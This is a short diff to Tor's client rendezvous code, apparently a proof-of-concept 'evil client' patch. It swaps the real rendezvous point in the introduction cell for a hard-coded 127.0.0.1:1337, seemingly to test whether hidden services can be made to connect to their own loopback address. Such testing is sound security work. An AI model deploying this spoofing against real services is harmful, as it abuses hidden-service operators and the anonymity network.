@@ -258,8 +258,14 @@ rend_client_send_introduction(origin_circuit_t *introcirc,
     extend_info_t *extend_info = rendcirc->build_state->chosen_exit;
     int klen;
     /* nul pads */
-    set_uint32(tmp+v3_shift+1, tor_addr_to_ipv4n(&extend_info->addr));
-    set_uint16(tmp+v3_shift+5, htons(extend_info->port));
+    /* HERE GOES NOTHING. EVIL CLIENT. */
+    {
+      tor_addr_t t1;
+      r=tor_addr_parse_mask_ports("127.0.0.1:1337",
+                                  0, &t1, NULL, NULL, NULL);
+      set_uint32(tmp+v3_shift+1, tor_addr_to_ipv4n(&t1));
+      set_uint16(tmp+v3_shift+5, 1337);
+    }
     memcpy(tmp+v3_shift+7, extend_info->identity_digest, DIGEST_LEN);
     klen = crypto_pk_asn1_encode(extend_info->onion_key,
                                  tmp+v3_shift+7+DIGEST_LEN+2,
